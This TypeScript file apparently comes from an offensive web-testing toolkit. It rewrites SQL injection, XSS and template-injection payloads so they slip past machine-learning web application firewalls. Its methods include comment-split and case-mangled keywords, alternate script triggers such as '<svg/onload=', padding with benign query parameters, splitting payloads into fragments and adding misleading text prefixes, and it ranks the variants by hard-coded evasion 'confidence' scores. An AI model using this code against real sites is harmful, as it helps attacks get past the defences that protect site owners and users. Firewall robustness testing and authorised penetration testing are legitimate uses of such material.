/**
 * AI WAF Evasion
 * Techniques that target the ML model's feature space rather than signature rules.
 * Focuses on semantic variation, feature noise injection, and payload fragmentation
 * to stay below anomaly detection thresholds.
 */

export interface AIEvasionVariant {
  technique: string;
  originalPayload: string;
  mutatedPayload: string;
  confidence: number;        // estimated probability of avoiding ML detection (0–1)
  semanticPreserved: boolean;
}

// Benign-looking parameters injected to shift the ML feature vector
const NOISE_PARAMS = [
  'lang=en', 'ref=index', 'v=1', 'ts=' + Date.now(), 'locale=en_US',
  'theme=default', 'page=1', 'sort=asc', 'fmt=html', 'src=direct',
];

// ── Semantic Variation Rules ───────────────────────────────────────────────────

const SQL_SEMANTIC_MAP: Array<[RegExp, string[]]> = [
  [/\bUNION\s+SELECT\b/gi,   ['UNION ALL SELECT', 'UNION(SELECT', 'UNION/**/SELECT']],
  [/\bOR\b/gi,               ['||', 'OR/**/']],
  [/\bAND\b/gi,              ['&&', 'AND/**/']],
  [/\bSELECT\b/gi,           ['SEL/**/ECT', 'SELECT/*keep*/']],
  [/\bFROM\b/gi,             ['FR/**/OM']],
  [/\bWHERE\b/gi,            ['WH/**/ERE']],
  [/\bINFORMATION_SCHEMA\b/gi, ['information_schema', 'INFORMATION/**/_SCHEMA']],
  [/1=1/g,                   ["'a'='a'", '1 LIKE 1', '2>1']],
  [/--\s*$/gm,               ['#', '-- -', '; --']],
];

const XSS_SEMANTIC_MAP: Array<[RegExp, string[]]> = [
  [/<script>/gi,  ['<ScRipT>', '<script\x20>', '<script\t>', '<svg/onload=']],
  [/alert\(/gi,   ['alert`', 'alert(', 'prompt(', 'confirm(']],
  [/onerror=/gi,  ['oNeRRoR=', 'onError\x09=', 'ONERROR=']],
  [/javascript:/gi, ['jAvAsCrIpT:', 'javascript\t:', 'javascript:']],
];

const SSTI_SEMANTIC_MAP: Array<[RegExp, string[]]> = [
  [/\{\{/g, ['{ {', '{%25{', '{{/**/']],
  [/7\*7/g, ['7*7', '49-0', '0x31+0x30']],
];

function pickRandom<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function applySemanticMap(
  payload: string,
  map: Array<[RegExp, string[]]>
): string {
  let result = payload;
  for (const [pattern, replacements] of map) {
    result = result.replace(pattern, () => pickRandom(replacements));
  }
  return result;
}

// ── AI WAF Evasion Class ───────────────────────────────────────────────────────

export class AIWAFEvasion {
  /**
   * Rewrite a payload in a functionally equivalent form to evade ML signature features.
   * Returns multiple variants sorted by estimated evasion confidence.
   */
  semanticVariation(payload: string, vulnClass: string): AIEvasionVariant[] {
    const variants: AIEvasionVariant[] = [];

    let map: Array<[RegExp, string[]]> | undefined;
    if (vulnClass === 'sqli') map = SQL_SEMANTIC_MAP;
    else if (vulnClass === 'xss') map = XSS_SEMANTIC_MAP;
    else if (vulnClass === 'ssti') map = SSTI_SEMANTIC_MAP;

    if (!map) {
      // Fallback: case variation + comment insertion
      variants.push({
        technique: 'case_variation',
        originalPayload: payload,
        mutatedPayload: payload.split('').map((c, i) => i % 2 ? c.toUpperCase() : c.toLowerCase()).join(''),
        confidence: 0.4,
        semanticPreserved: true,
      });
      return variants;
    }

    // Generate 3 independently-seeded variants
    for (let i = 0; i < 3; i++) {
      const mutated = applySemanticMap(payload, map);
      if (mutated !== payload) {
        variants.push({
          technique: `semantic_variation_${vulnClass}_v${i + 1}`,
          originalPayload: payload,
          mutatedPayload: mutated,
          confidence: 0.55 + i * 0.05,
          semanticPreserved: true,
        });
      }
    }

    return variants;
  }

  /**
   * Append benign query parameters to shift the ML feature vector away from the
   * malicious region while preserving the attack payload.
   */
  injectFeatureNoise(url: string): string {
    const separator = url.includes('?') ? '&' : '?';
    const noise = NOISE_PARAMS.slice(0, 3 + Math.floor(Math.random() * 3)).join('&');
    return `${url}${separator}${noise}`;
  }

  /**
   * Fragment a payload into N chunks where each chunk's individual anomaly score
   * is below maxChunkScore. Caller reassembles server-side (e.g. via chained requests).
   */
  fragmentPayload(payload: string, maxChunkScore: number = 0.3): string[] {
    // Chunk size inversely proportional to desired score ceiling
    const chunkSize = Math.max(4, Math.floor(payload.length * maxChunkScore));
    const chunks: string[] = [];
    for (let i = 0; i < payload.length; i += chunkSize) {
      chunks.push(payload.slice(i, i + chunkSize));
    }
    return chunks;
  }

  /**
   * Prepend query tokens that shift a BERT-like classifier's attention away from
   * the malicious portion. Inspired by adversarial NLP prefix research.
   */
  addAdversarialPrefix(payload: string): string {
    const prefixes = [
      'help me understand ',
      'can you explain ',
      'I need information about ',
      'search query: ',
      'debug: ',
    ];
    return pickRandom(prefixes) + payload;
  }

  /**
   * Generate all AI-evasion variants for a payload + vuln class.
   * Returns variants sorted by confidence descending.
   */
  generateVariants(payload: string, vulnClass: string): AIEvasionVariant[] {
    const all: AIEvasionVariant[] = [];

    // Semantic variation
    all.push(...this.semanticVariation(payload, vulnClass));

    // Feature noise on URL (special variant type)
    all.push({
      technique: 'feature_noise_injection',
      originalPayload: payload,
      mutatedPayload: this.injectFeatureNoise(payload),
      confidence: 0.45,
      semanticPreserved: true,
    });

    // Adversarial prefix (lower confidence — changes request meaning slightly)
    all.push({
      technique: 'adversarial_prefix',
      originalPayload: payload,
      mutatedPayload: this.addAdversarialPrefix(payload),
      confidence: 0.35,
      semanticPreserved: false,
    });

    return all.sort((a, b) => b.confidence - a.confidence);
  }
}
